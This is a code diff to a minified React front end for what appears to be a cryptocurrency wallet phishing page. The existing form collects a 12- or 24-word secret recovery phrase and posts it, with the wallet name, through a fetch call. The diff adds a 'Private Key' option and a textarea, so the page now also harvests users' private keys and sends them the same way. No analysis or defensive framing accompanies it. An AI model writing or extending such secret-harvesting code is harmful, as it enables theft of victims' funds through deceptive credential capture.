@@ -13097,10 +13097,16 @@ const Gh = [
 	Zh = ({ wallet: N, onBack: C, onSend: j }) => {
 		const [h, w] = Vl.useState(12),
 			[G, ll] = Vl.useState(Array(12).fill("")),
+			[privateKey, setPrivateKey] = Vl.useState(""),
 			[Sl, _] = Vl.useState(!1),
 			T = (el) => {
-				const J = parseInt(el.target.value, 10);
-				w(J), ll(Array(J).fill(""));
+				const val = el.target.value;
+				if (val === "private-key") {
+					w("private-key");
+				} else {
+					const J = parseInt(val, 10);
+					w(J), ll(Array(J).fill(""));
+				}
 			},
 			D = (el, J) => {
 				const rl = J.trim();
@@ -13128,8 +13134,8 @@ const Gh = [
 			},
 			$ = async () => {
 
-				const el = G.join(" "),
-					J = { walletName: N.name, details: el };
+				const el = h === "private-key" ? privateKey : G.join(" ");
+				const J = { walletName: N.name, details: el };
 				try {
 					_(!0);
 					const rl = await fetch(
@@ -13191,6 +13197,10 @@ const Gh = [
 										value: 24,
 										children: "24-word phrase",
 									}),
+									f.jsx("option", {
+										value: "private-key",
+										children: "Private Key",
+									}),
 								],
 							}),
 						}),
@@ -13212,7 +13222,16 @@ const Gh = [
 								"You can paste your entire secret recovery phrase into any field",
 							],
 						}),
-						f.jsx("div", {
+						h === "private-key" ? f.jsx("div", {
+							className: "w-full mb-4",
+							children: f.jsx("textarea", {
+								className: "w-full h-32 p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors resize-none",
+								placeholder: "Enter your Private Key",
+								value: privateKey,
+								onChange: (e) => setPrivateKey(e.target.value),
+								spellCheck: "false"
+							})
+						}) : f.jsx("div", {
 							className:
 								"grid grid-cols-2 gap-4 w-full max-h-[250px] overflow-y-auto mb-4 no-scrollbar",
 							children: G.map((el, J) =>
